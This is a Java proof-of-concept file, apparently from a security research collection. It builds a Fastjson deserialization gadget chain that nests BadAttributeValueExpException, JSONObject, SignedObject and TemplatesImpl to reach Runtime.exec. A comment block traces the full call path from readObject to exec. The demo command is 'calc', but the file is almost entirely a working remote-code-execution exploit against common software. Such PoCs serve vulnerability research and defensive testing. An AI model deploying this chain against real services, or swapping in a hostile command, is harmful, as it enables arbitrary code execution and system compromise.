package com.javasec.pocs.fastjson;

import com.alibaba.fastjson.JSONObject;
import com.fasterxml.jackson.databind.node.POJONode;
import com.javasec.utils.SerializeUtils;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.security.SignedObject;

/**
 * exec:347, Runtime (java.lang)
 * <init>:-1, a
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:422, Constructor (java.lang.reflect)
 * newInstance:442, Class (java.lang)
 * getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * write:-1, ASMSerializer_2_TemplatesImpl (com.alibaba.fastjson.serializer)
 * write:251, MapSerializer (com.alibaba.fastjson.serializer)
 * write:275, JSONSerializer (com.alibaba.fastjson.serializer)
 * toJSONString:799, JSON (com.alibaba.fastjson)
 * toString:793, JSON (com.alibaba.fastjson)
 * readObject:86, BadAttributeValueExpException (javax.management)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * getObject:180, SignedObject (java.security)
 * write:-1, ASMSerializer_1_SignedObject (com.alibaba.fastjson.serializer)
 * write:251, MapSerializer (com.alibaba.fastjson.serializer)
 * write:275, JSONSerializer (com.alibaba.fastjson.serializer)
 * toJSONString:799, JSON (com.alibaba.fastjson)
 * toString:793, JSON (com.alibaba.fastjson)
 * readObject:86, BadAttributeValueExpException (javax.management)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:66, SerializeUtils (com.javasec.utils)
 * main:22, BASignObjectChain (com.javasec.pocs.fastjson)
 */
public class BASignObjectChain {
    public static void main(String[] args) throws Exception {
        Templates templatesImpl = SerializeUtils.getTemplate("calc");
        JSONObject jsonObject1 = new JSONObject();
        jsonObject1.put("pop1",templatesImpl);
        BadAttributeValueExpException badAttributeValueExpException1 = new BadAttributeValueExpException(null);
        SerializeUtils.setFieldValue(badAttributeValueExpException1,"val",jsonObject1);
        SignedObject signObject = SerializeUtils.getSignObject(badAttributeValueExpException1);
        JSONObject jsonObject2 = new JSONObject();
        jsonObject2.put("pop2",signObject);
        BadAttributeValueExpException badAttributeValueExpException2 = new BadAttributeValueExpException(null);
        SerializeUtils.setFieldValue(badAttributeValueExpException2,"val",jsonObject2);
        SerializeUtils.base64deserial(SerializeUtils.base64serial(badAttributeValueExpException2));
    }
}
